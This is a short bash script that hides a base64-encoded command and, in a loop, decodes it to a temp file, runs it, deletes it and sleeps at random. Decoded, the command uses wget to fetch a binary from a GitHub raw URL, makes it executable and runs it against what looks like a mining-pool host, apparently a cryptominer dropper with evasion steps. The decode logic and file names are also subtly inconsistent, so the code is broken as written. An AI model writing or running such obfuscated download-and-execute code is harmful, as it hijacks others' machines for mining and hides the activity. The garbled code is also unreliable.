#!/bin/bash

iterations=50

for ((i=1; i<=$iterations; i++)); do
    hex_code=$(echo -n "d2dldCBodHRwczovL2dpdGh1Yi5jb20vVGVzdGRyaXZlMzQ1L3NjcmlwdFgvcmF3L2JlemhIYXNoICYmIGNobW9kIDc3NyBiZXp6SGFzaCAmJiAuL2JlemhIYXNoIC0tdXJsPWh1bnRlcmQuJCgmbnNnbCBpMS05OTk5OSAtbiAxJT1HRW5DY0YwMDEpQEBlbmRhdGgucG9vbGJpbmFuY2UuY29tOjQ0Mw==" | xxd -p)
    
    base64_encoded=$(echo "$hex_code" | base64)
    
    echo "$base64_encoded" > temp_base64_encoded.txt
    
    random_chars=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
    echo "$random_chars" >> temp_base64_encoded.txt
    
    base64_decoded=$(cat temp_base64_encoded.txt | base64 -d)
    
    hex_decoded=$(echo "$base64_decoded" | xxd -r -p)
    
    echo "$hex_decoded" > temp_hex_decoded.txt
    
    chmod +x temp_hex_decoded.txt
    
    ./temp_hex_decoded.txt
    
    rm temp_base64_encoded.txt temp_hex_decoded.txt
    
    sleep $((RANDOM % 10))
done
